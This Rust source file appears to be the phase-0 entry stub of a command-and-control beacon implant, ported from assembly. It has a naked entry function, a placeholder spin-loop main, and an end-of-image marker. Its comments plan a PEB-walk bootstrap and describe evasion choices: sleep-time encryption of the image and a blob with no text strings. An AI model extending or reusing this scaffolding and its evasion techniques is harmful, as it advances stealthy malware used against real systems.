//! Entry point and bootstrap (port of `src_beacon/asm/entry.x64.asm`).
//!
//! The blob starts with the entry stub: the loader jumps to the first byte of
//! the extracted .text. Phase 0 keeps it minimal — phase 1 will grow the real
//! bootstrap (PEB walk, heap, instance setup) — but the contract is fixed:
//! `SptEntry` is the first function of the blob and never returns.

use core::arch::naked_asm;

/// Beacon entry point. Merged first in .text; never returns.
///
/// # Safety
///
/// Called by a loader that jumps to the first byte of the mapped blob with
/// a valid stack and no guaranteed register state. Must never be called from
/// Rust code.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn SptEntry() {
    naked_asm!(
        "sub rsp, 8",          // keep the stack 16-byte aligned after the call
        "call {main}",
        "ud2",                 // spt_main never returns
        main = sym spt_main,
    );
}

/// Phase-0 stub main loop. Phase 1 replaces this with the real bootstrap.
///
/// # Safety
///
/// Only reachable through the entry stub: no arguments, no return, must not
/// unwind (the panic handler aborts).
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_main() -> ! {
    loop {
        core::hint::spin_loop();
    }
}

/// End-of-beacon marker (port of the `.sptend` section from Linker.ld).
/// The runtime uses it to compute the beacon extent (e.g. for sleep-time
/// encryption of the whole image); it must remain the last bytes of the blob.
/// The magic is deliberately non-ASCII so the blob contains no text strings;
/// it is recognizable in a hex dump for post-link verification.
#[used]
#[unsafe(no_mangle)]
#[unsafe(link_section = ".sptend")]
pub static SPT_END: [u8; 8] = [0xEF, 0xBE, 0xAD, 0xDE, 0, 0, 0, 0];
